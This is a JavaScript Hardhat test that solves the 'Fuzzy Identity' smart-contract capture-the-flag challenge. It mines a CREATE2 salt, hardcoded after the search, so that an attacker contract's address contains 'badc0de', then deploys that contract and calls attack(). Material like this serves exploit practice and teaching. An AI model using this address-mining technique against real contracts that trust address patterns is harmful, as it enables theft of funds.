const { expect } = require("chai");
const { buildContract } = require("../utils");
const assert = require('node:assert').strict;

function findSalt(signer, initCodeHash) {
  return "0xa2cd8ce4ee7dc6dc31b15cf382275aba37349ba056f6bb0b829092e654e5cf0c";
  for (let i = 0; ; ++i) {
    const salt = ethers.solidityPackedKeccak256(["uint"], [i]);
    const contractAddress = ethers.getCreate2Address(
      signer,
      salt,
      initCodeHash,
    );
    if (contractAddress.toLowerCase().includes("badc0de")) {
      // Found salt: 0xa2cd8ce4ee7dc6dc31b15cf382275aba37349ba056f6bb0b829092e654e5cf0c 0xc2e37186dE9f9b4bBbADC0de69a2a923A25FDb5e
      console.log("Found salt:", salt, contractAddress);
      return salt;
    }
    if (i % 1000 === 0) {
      console.log("Checked", i, "...");
    }
  }
}

async function calcAttackerContractInitCode(challengeAddress) {
  // initCode = abi.encodePacked(bytecode, abi.encode(...args))
  // https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2
  const factory = await ethers.getContractFactory("FuzzyIdentityChallengeAttacker");
  return ethers.solidityPacked(
      ["bytes", "bytes32"], 
      [factory.bytecode, ethers.AbiCoder.defaultAbiCoder().encode(["address"], [challengeAddress])]
  );
}

it("Solves FuzzyIdentityChallenge", async function () {
  // This challenge should be run independently instead of running in batch with other tests since the `challengeAddress` would not be the same
  // due to different nonces the signer has deployed.
  const [attacker] = await ethers.getSigners();
  const contract = await buildContract("FuzzyIdentityChallenge");
  const challengeAddress = await contract.getAddress();

  // Calculate initCode for FuzzyIdentityChallengeAttacker.
  const initCode = await calcAttackerContractInitCode(challengeAddress);
  const initCodeHash = ethers.keccak256(initCode);

  // Deploy FuzzyIdentityChallengeAttackerFactory contract.
  const factoryContract = await buildContract("FuzzyIdentityChallengeAttackerFactory");
  const factoryContractAddress = await factoryContract.getAddress();

  // Calculate salt.
  const salt = findSalt(factoryContractAddress, initCodeHash);

  // Deploy attacker contract.
  await factoryContract.deploy(initCode, salt);

  // Verify attacker contract address is as expected.
  const attackerContractAddress = await factoryContract.deployAddress();
  const attackerExpectedAddress = ethers.getCreate2Address(
    factoryContractAddress,
    salt,
    initCodeHash,
  );
  assert(attackerContractAddress === attackerExpectedAddress);
  console.log(attackerContractAddress);

  // Attack.
  const attackerContractfactory = await ethers.getContractFactory("FuzzyIdentityChallengeAttacker");
  const attackerContract = attackerContractfactory.attach(attackerContractAddress);
  await attackerContract.attack();

  expect(await contract.isComplete()).to.equal(true);
});
